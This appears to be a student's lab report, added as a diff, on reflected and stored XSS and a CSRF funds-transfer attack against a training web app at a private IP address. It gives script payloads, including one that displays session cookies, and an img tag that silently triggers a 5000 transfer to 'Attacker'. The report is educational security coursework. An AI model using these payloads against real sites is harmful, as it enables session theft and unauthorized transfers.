@@ -1,0 +1,48 @@
+===========================================
+XSS + CSRF Report – S26
+Author: Jasmine
+===========================================
+
+
+SECTION 1: REFLECTED XSS (SEARCH BAR)
+-------------------------------------------
+HTML payload I used:
+<h1>Hacked</h1>
+
+JavaScript payload I used:
+<script>alert('XSS')</script>
+
+Why this disappears on refresh:
+The search bar only shows what I type into it. It doesn’t save anything, so when the page reloads, the input is gone and the XSS doesn’t run anymore.
+
+
+SECTION 2: STORED XSS (MESSAGE BOARD)
+-------------------------------------------
+Stored XSS payload:
+<script>alert(document.cookie)</script>
+
+Cookie value shown (example):
+session_id=abc123xyz
+
+Why this one stays:
+The message board saves the comment in the database, so the script runs every time the page loads. This makes it a stored XSS attack.
+
+
+SECTION 3: CSRF ATTACK (SEND FUNDS)
+-------------------------------------------
+Normal transfer URL:
+http://172.30.183.129:8081/transfer?to=Alice&amount=10
+
+Malicious CSRF URL:
+http://172.30.183.129:8081/transfer?to=Attacker&amount=5000
+
+Weaponized version (auto‑executes when viewed):
+<img src="http://172.30.183.129:8081/transfer?to=Attacker&amount=5000">
+
+Explanation:
+There is no CSRF token, so the server accepts the request without checking if the user meant to send the money. Anyone logged in who loads the image would trigger the transfer.
+
+
+===========================================
+END OF REPORT
+===========================================
